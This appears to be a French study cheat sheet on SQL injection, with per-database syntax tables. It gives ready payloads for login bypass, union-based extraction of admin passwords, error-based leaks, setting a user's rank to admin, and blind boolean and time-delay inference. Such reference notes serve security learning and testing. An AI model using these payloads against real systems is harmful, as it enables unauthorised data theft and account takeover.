# Introduction

Les injections SQL consistent à détourner la payload traditionnelle d'SQL pour y injecter du code SQL. On liste différents SGBD qui auront chacun sa syntaxe.

```sql
select *
from ma_table
where col = $var and ...;
```
avec `col` un string.
Avec `$var = ' or 1=1;--`
```sql
select *
from ma_table
where col = '' or 1=1;--' and ...;
```
Plusieurs techniques permettent plusieurs résultats, dont l'exfiltration de données, et cetera.
# Syntaxes rapides

Fiche : https://portswigger.net/web-security/sql-injection/cheat-sheet
## Rappels syntaxe

- `'` marquage string
- Logique : `or 1=1` toujours **vrai**, `and 1=2` toujours **faux**, `or 1=2` toujours **neutre**
- Wildcard : `like 'marc%'` avec `%`

| Opération     | Oracle                | MSSQL                    | PgSQL                           | MySQL                                                     |
| ------------- | --------------------- | ------------------------ | ------------------------------- | --------------------------------------------------------- |
| Commentaire   | `--comm`              | `--comm`<br>`/*comm*/`   | `--comm`<br>`/*comm*/`          | `#comm`<br>`-- comm` (attention espace)<br>`/*comm*/`     |
| Concaténation | 'a' \|\| 'b'          | `'a' + 'b'`              | 'a' \|\| 'b'                    | `'a' 'b'`<br>(attention espace)<br><br>`concat('a', 'b')` |
| Substring     | `substr('abc', 1, 1)` | `substring('abc', 1, 1)` | `substring('abc', 1, 1)`        | `substring('abc', 1, 1)`                                  |
| Ascii         | `ascii(x)`            | `ascii(x)`               | `ascii(x)`                      | `ascii(x)`<br>`ord(x)`                                    |
| Length        | `length(x)`           | `len(x)`                 | `length(x)`<br>`char_length(x)` | `length(x)`<br>`char_length(x)`                           |
> Toujours utiliser `-- ` **avec** l'espace.

| Type de donnée                    | Oracle                                                                    | MSSQL                                   | PgSQL                          | MySQL                                                      |
| --------------------------------- | ------------------------------------------------------------------------- | --------------------------------------- | ------------------------------ | ---------------------------------------------------------- |
| string<br>s = size                | `varchar2(s)`                                                             | `varchar(s)`                            | `varchar(s)`<br>`text`         | `varchar(s)`<br>`char(s)`                                  |
| int                               | `number`<br>`integer`                                                     | `int`<br>`bigint`                       | `int`<br>`integer`             | `int`                                                      |
| float<br>t = nb tot<br>v = nb vig | `number(t, v)`                                                            | `decimal(t, v)`<br>`float`              | `numeric(t, v)`<br>`float`     | `decimal(t, v)`<br>`float`                                 |
| dates                             | `date`<br>`timestamp`                                                     | `date`<br>`datetime`                    | `date`<br>`timestamp`          | `date`<br>`datetime`                                       |
| booléens                          | Aucun                                                                     | `bit`                                   | `boolean`                      | `boolean`<br>`tinyint(1)`                                  |
| Casting                           | `to_char(x)`<br>`to_number(x)` (int et float)<br>`to_date(x, format)`<br> | `cast(x as TYPE)`<br>`convert(TYPE, x)` | `cast(x as TYPE)`<br>`x::TYPE` | `cast(x as TYPE)`<br>`str_to_date(x)` (dates from strings) |
> MySQL : utiliser `char` pour strings et `signed`/`unsigned` pour int **lors d'un cast**.
## Points d'entrée

```sql
-- SELECT

select *
from ma_table
join $var on ($var = $var2) -- using($var) pour matching de nom
where col = $var
group by $var
having fct($var)
order by $var asc/desc
limit $var

-- INSERT

insert into t (col, col2) values ($var, $var2), ($var3, $var4), ...
insert into t values ($var, $var2), ($var3, $var4), ...

-- UPDATE

update ma_table
set col = $var, col2 = $var2
where col = $var3

-- DELETE

delete from ma_table
where col = $var;

-- QUERIES STACKABLES (hors Oracle)
(Query A); (Query B)
select * from products where category = ''; select * from users--'
```
# Mécanismes de base des SQLi
## Obtenir les métadonnées

> **But** : obtenir métadonnées du SGBD.
```sql
select * from products where category = $var
```

- `' union select @@version, ..., null--`
```sql
select * from products where category = '' union select @@version, ..., null--'
```

| Métadonnée           | Oracle                                                                     | MSSQL                                                                                                  | PgSQL                                                                                                  | MySQL                                                                                                  |
| -------------------- | -------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| Version              | select banner<br>from v\$version<br><br>select version<br>from v\$instance | select @@version                                                                                       | select version()                                                                                       | select @@version                                                                                       |
| Listing des tables   | select owner, table_name, tablespace_name from all_tables<br><br>          | select table_catalog, table_schema, table_name, table_type from information_schema.tables              | select table_catalog, table_schema, table_name, table_type from information_schema.tables              | select table_catalog, table_schema, table_name, table_type from information_schema.tables              |
| Listing des colonnes | select owner, table_name, column_name, data_type from all_tab_columns      | select table_catalog, table_schema, table_name, column_name, data_type from information_schema.columns | select table_catalog, table_schema, table_name, column_name, data_type from information_schema.columns | select table_catalog, table_schema, table_name, column_name, data_type from information_schema.columns |
- Oracle :
    - `owner` : utilisateur propriétaire.
    - `tablespace_name` : stockage physique.
    - `table_name` : Nom table en majuscules.
    - `column_name` : Nom colonne en majuscules.
    - `data_type` : Type de donnée colonne.

- Autre :
	- `table_catalog` : DB d'appartenance.
	- `table_schema` : Namespace.
	- `table_name` : Nom table.
	- `table_type` : Table de base ou vue.
	- `column_name` : Nom colonne.
	- `data_type` : Type de donnée colonne.
## Déterminer le schéma de la base
### Déterminer le type des colonnes

> **But** : colonne par colonne, on va essayer plusieurs types de données pour voir si ça plante.
> **Prérequis** : connaître nb de colonnes.
> **Astuce** : éviter les casts implicits.
> **Astuce** : test **colonne par colonne**.
```sql
select * from users where name = $name and password = $password
```

- `' union select null, ..., 'stringtest', ..., null--`
- **Oracle** avec from dual : `' union select null, ..., 'stringtest', ..., null from dual--`
```sql
select * from users where name = '' union select 'stringtest', null--' and password = '...'
-- >> err : 1re colonne pas un string

select * from users where name = '' union select null, 'stringtest'--' and password = '...'
-- >> pas err : 2e colonne potentiellement un string (dépend de si le string peut se caster)

-- Oracle
select * from users where name = '' union select 'stringtest', null from dual--' and password = '...'
```
### Compter les colonnes retournées
#### Par order by

> **But** : Tester séquentiellement le nb de colonne à filtrer jusqu'à tomber sur une erreur à cause d'un dépassement, `order by $x` = ordonner sur la x-ième colonne.
```sql
select * from products where category = $var
```

- `' order by x--` (x = 1, 2, ...)
```sql
select * from products where category = '' order by x--'
```
#### Par union

> **But** : Tester séquentiellement l'`union` pour compter les colonnes (nb `null` = nb colonnes), `null` compatible avec quasiment tous les datatypes.
```sql
select * from products where category = $var
```

- nb null = nb colonnes : `' union select null, ..., null--`
-  **Oracle** avec from dual : `' union select null, ..., null from dual--`
```sql
-- Essai 1 (1 null)
select * from products where category = '' union select null--'
-- >> err : pas une seule colonne

-- Essai 2 (2 null)
select * from products where category = '' union select null, null--'
-- >> pas err : 2 colonnes retournées

-- Oracle
select * from products where category = '' union select null from dual--'
```
## Manipulation des données
### Exfiltration des données
#### Données issues de la même table cible

> **But** : récupérer des données et bypasser une condition
```sql
select * from products where category = $var and released = 1 -- que les objets released
```

- Filtre et skip : `cat'--`
```sql
select * from products where category = 'cat'--' and released = 1
```

- Skip : `' or 1=1--`
```sql
select * from products where category = '' or 1=1--' and released = 1
```
#### Données issues d'autres tables

> **But** : récupérer des données d'autres colonnes via une union.
> **Prérequis** : avoir nom des tables et colonnes.
> **Prérequis** : matcher nb colonnes et types des colonnes.
```sql
select * from products where category = $var
```

- `' union select ... from t--`
```sql
select * from products where category = '' union select ... from t--'
-- >> err : nb ou types colonne incompatible.
-- >> pas err : résultats obtenus.
```
#### Erreur renvoyant les données

> **But** : Générer un message d'erreur contenant les valeurs.
```sql
select * from users where username = $user and password = $pass
```

- `' union select 'foo' where 1 = (select password from users where username = 'admin' limit 1), ..., null--`
```sql
select * from users where username = '' union select 'foo' where 1 = (select password from users where username = 'admin' limit 1), ..., null--' and password = ''
-- >> Conversion failed when converting the varchar value 'password1234' to datatype int
```

| Oracle | MSSQL                                          | PgSQL                                            | MySQL                                                                                         |
| ------ | ---------------------------------------------- | ------------------------------------------------ | --------------------------------------------------------------------------------------------- |
| /      | select 'foo' where<br>1 = (select ... limit 1) | select cast((<br>select ... limit 1<br>) as int) | select 'foo' where<br>1=1 and extractvalue(<br>1, concat(0x5c, (<br>select ... limit 1<br>))) |
### Compacter les données

> **But** : concaténer les données dans un unique varchar.
> **Prérequis** : avoir nom des colonnes.
> **Prérequis** : matcher nombre de colonnes (padder avec `null` si nécessaire).
> **Prérequis** : doit aller dans un varchar.
> **Astuce** : utiliser méthodes de casts.
> **Astuce** : pas dépasser taille du varchar.
```sql
select * from products where category = $var
```

- `' union select cast(col1 as varchar) || ' ~ ' || ... || ' ~ ' || cast(coln as varchar), ..., null from t--`
```sql
select * from products where category = '' union select cast(col1 as varchar) || ' ~ ' || ... || ' ~ ' || cast(coln as varchar), ..., null from t--'
```
### Modifier la table

> **But** : altérer la table.
> **Prérequis** : avoir nom des colonnes.
```sql
update users
set username = $var
where col = $var2
```

- `value', rank = 'admin`
```sql
update users
set username = 'value', rank = 'admin'
where col = '...'
```
# Techniques d'injection à l'aveugle

Techniques utilisées pour remarquer une différence de traitement. Renvoie des résultats booléens sur le SGBD.
## Par logique

> **But** : Exploiter diffs visuelles en fonction d'une conditionnelle injectée.
> **Prérequis** : Utiliser **requêtes unicellulaires** pour utiliser comparaisons.
> **Astuce** : Analyser les diffs sur page avant et après requête.
> **Astuce** : Énumération explicite.
> 
> **Attention** : `<`, `>` sur str utilise ordre ASCII comme en C.
```sql
select * from products where category = $var
```

- Égalité : `' and (select substring(password, 1, 1) from users where username = 'admin') = 'a'--`
```sql
select * from products where category = '' and (select substring(password, 1, 1) from users where username = 'admin') = 'a'--'
```

- Inégalité (>=, <=) : `' and (select substring(password, 1, 1) from users where username = 'admin') >= 'm'--`
```sql
select * from products where category = '' and (select substring(password, 1, 1) from users where username = 'admin') >= 'm'--'

-- Complémentaire de
select * from products where category = '' and (select substring(password, 1, 1) from users where username = 'admin') < 'm'--'
-- >> Attention : les chiffres sont < 'm' en ASCII
```

| Opération                             | Oracle            | MSSQL                         | PgSQL                           | MySQL                                  |
| ------------------------------------- | ----------------- | ----------------------------- | ------------------------------- | -------------------------------------- |
| Substring<br>s: start<br>l: length    | `substr(x, s, l)` | `substring(x, s, l)`          | `substring(x, s, l)`            | `substring(x, s, l)`<br>`mid(x, s, l)` |
| Alternatives à substring<br>l: length | /                 | `left(x, l)`<br>`right(x, l)` | `left(x, l)`<br>`right(x, l)`   | `left(x, l)`<br>`right(x, l)`          |
| Ascii                                 | `ascii(x)`        | `ascii(x)`                    | `ascii(x)`                      | `ascii(x)`<br>`ord(x)`                 |
| Length                                | `length(x)`       | `len(x)`                      | `length(x)`<br>`char_length(x)` | `length(x)`<br>`char_length(x)`        |
## Par erreur conditionnelle

> **But** : Générer une erreur SQL en fonction d'une condition injectée.
```sql
select * from products where category = $var
```

- `' and (select case when (cond) then 1/0 else null end)--`
```sql
select * from products where category = '' and (select case when (cond) then 1/0 else null end)--'
```

| Oracle                                                                  | MSSQL                                                | PgSQL                                                               | MySQL                                                                              |
| ----------------------------------------------------------------------- | ---------------------------------------------------- | ------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| select case when<br>(cond) then to_char(1/0)<br>else null end from dual | select case when<br>(cond) then 1/0<br>else null end | 1 = (select case when<br>(cond) then 1/(select 0)<br>else null end) | select if (cond, (select<br>table_name from<br>information_schema.tables),<br>'a') |
| /                                                                       | select 1/0<br>where cond                             | select 1/(case when<br>(cond) then 0 else<br>1 end)                 | select exp(999 where (cond))                                                       
## Par délai conditionnel

> **But** : Générer un délai en fonction d'une condition injectée.
```sql
select * from products where category = $var
```

- `' and (select case when (cond) then pg_sleep(5) else pg_sleep(0) end) is not null--`
```sql
select * from products where category = '' and (select case when (cond) then pg_sleep(5) else pg_sleep(0) end) is not null--'
```

| Oracle                                                                                                       | MSSQL                                                                                           | PgSQL                                                                                | MySQL                                                      |
| ------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ | ---------------------------------------------------------- |
| dbms_pipe.receive_message('a', x)                                                                            | waitfor delay '0:0:x'                                                                           | pg_sleep(x)                                                                          | sleep(x)                                                   |
| 1=(select case when<br>(cond) then<br>'a' \|\| dbms_pipe.receive_message('a', 5)<br>else null end from dual) | 1=(select case when<br>(cond) then (select<br>1 where 1=1 waitfor delay '0:0:5')<br>else 1 end) | (select case when (cond)<br>then pg_sleep(x) else<br>pg_sleep(0) end) is not<br>null | 1=(select case when<br>(cond) then sleep(5)<br>else 0 end) |
